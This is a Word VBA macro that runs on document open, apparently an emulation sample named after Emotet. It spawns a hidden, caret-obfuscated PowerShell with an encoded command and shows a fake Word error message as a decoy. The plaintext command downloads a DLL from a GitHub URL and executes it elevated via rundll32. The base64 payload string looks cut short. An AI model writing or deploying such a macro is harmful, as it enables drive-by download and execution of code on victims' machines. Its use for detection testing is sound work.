Private Sub Document_Open()

Set a = GetObject("winmgmts:Win32_ProcessStartup")
Set config = a.SpawnInstance_
config.ShowWindow = 12
Set b = GetObject("winmgmts:Win32_Process")
commandString = "$csi = New-Object System.Net.WebClient; $csi.Headers['User-Agent'] = 'Mozilla/5.0';$csi.DownloadFile('https://github.com/bobbybaer/WindowsEventLogs/raw/main/rundll32/emotetImitation.dll', ($env:USERPROFILE +'\Documents\emotetImitation1.dll')); Start-Process rundll32.exe -Verb runAs -ArgumentList ""($env:USERPROFILE +'\Documents\emotetImitation1.dll'), func"";"
commandStringB64 = "JABjAHMAaQAgAD0AIABOAGUAdwAtAE8AYgBqAGUAYwB0ACAAUwB5AHMAdABlAG0ALgBOAGUAdAAuAFcAZQBiAEMAbABpAGUAbgB0ADsAIAAkAGMAcwBpAC4ASABlAGEAZABlAHIAcwBbACcAVQBzAGUAcgAtAEEAZwBlAG4AdAAnAF0AIAA9A"
commandStringB64 = commandStringB64 + ""
returnV = b.Create("cmd cmd cmd cmd  /c msg %username% /v Word experienced an error trying to open the file. & P^Ow^er^she^L^L -w hidden -encodedCommand " & commandStringB64, "C:\Users\Bastian.BACHELOR\Desktop", config, processID)

End Sub


